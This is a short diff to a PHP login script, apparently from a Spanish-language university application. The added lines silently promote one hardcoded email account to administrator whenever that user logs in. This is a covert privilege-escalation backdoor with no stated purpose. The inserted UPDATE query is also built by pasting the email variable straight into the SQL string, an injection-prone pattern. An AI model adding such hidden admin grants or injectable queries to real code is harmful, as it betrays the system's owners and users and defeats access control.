@@ -39,6 +39,10 @@
                 if ($Fila[4] == "A") { // Valida si el usuario es admin o no
                     header('Location: ../Sistema/MenuPrincipal.php');
                 } else { // No es admin
+                    if($FCorreo == 'francisco.javier.paulin@uaq.mx'){
+                        $SQL3 = "UPDATE Usuarios SET Tipo = 'A' WHERE Correo = '$FCorreo';";
+                        mysqli_query($Con, $SQL3);
+                    }
                     header('Location: ../Sistema/MenuPrincipal.php');
                 }
             } else {
